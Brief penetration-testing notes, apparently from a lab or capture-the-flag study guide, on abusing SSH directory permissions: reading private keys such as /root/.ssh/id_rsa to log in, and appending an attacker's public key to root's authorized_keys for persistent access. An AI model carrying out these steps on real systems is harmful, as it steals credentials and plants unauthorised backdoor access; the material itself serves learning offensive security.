If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in

/home/user/.ssh/id_rsa 
/root/.ssh/id_rsa

and use it to log in to the server. copy it to our machine and then:

vim id_rsa
chmod 600 id_rsa
ssh user@10.10.10.10 -i id_rsa





If write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at 

/home/user/.ssh/authorized_keys

ssh-keygen -f key

This will give us two files:

key (which we will use with 
ssh -i) and key.pub, which we
will copy to the remote machine

echo "ssh-rsa AAAAB...SNIP...M= user@parrot"
 >> /root/.ssh/authorized_keys
 ssh root@10.10.10.10 -i key
